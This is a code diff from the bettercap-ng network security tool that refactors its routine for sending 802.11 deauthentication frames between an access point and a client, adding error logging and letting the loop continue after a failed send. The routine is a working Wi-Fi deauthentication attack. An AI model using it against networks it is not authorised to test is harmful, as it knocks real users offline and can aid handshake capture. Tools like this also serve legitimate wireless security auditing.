@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/evilsocket/bettercap-ng/core"
+	"github.com/evilsocket/bettercap-ng/log"
 	"github.com/evilsocket/bettercap-ng/network"
 	"github.com/evilsocket/bettercap-ng/session"
 
@@ -235,26 +236,22 @@ func (w *WDiscovery) buildDeauthPkt(address1 net.HardwareAddr, address2 net.Hard
 }
 
 func (w *WDiscovery) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
-	var pkt []byte
-	var err error
-
-	var seq uint16
-	for seq = 0; seq < 64; seq++ {
-		pkt = w.buildDeauthPkt(ap, client, ap, layers.Dot11TypeMgmtDeauthentication, layers.Dot11ReasonClass2FromNonAuth, seq)
-		err = w.Handle.WritePacketData(pkt)
-		if err != nil {
-			return
+	for seq := uint16(0); seq < 64; seq++ {
+		pkt := w.buildDeauthPkt(ap, client, ap, layers.Dot11TypeMgmtDeauthentication, layers.Dot11ReasonClass2FromNonAuth, seq)
+		if err := w.Handle.WritePacketData(pkt); err != nil {
+			log.Error("Could not send deauth packet: %s", err)
+			continue
+		} else {
+			time.Sleep(2 * time.Millisecond)
 		}
-
-		time.Sleep(2 * time.Millisecond)
 
 		pkt = w.buildDeauthPkt(client, ap, ap, layers.Dot11TypeMgmtDeauthentication, layers.Dot11ReasonClass2FromNonAuth, seq)
-		err = w.Handle.WritePacketData(pkt)
-		if err != nil {
-			return
+		if err := w.Handle.WritePacketData(pkt); err != nil {
+			log.Error("Could not send deauth packet: %s", err)
+			continue
+		} else {
+			time.Sleep(2 * time.Millisecond)
 		}
-
-		time.Sleep(2 * time.Millisecond)
 	}
 }
 
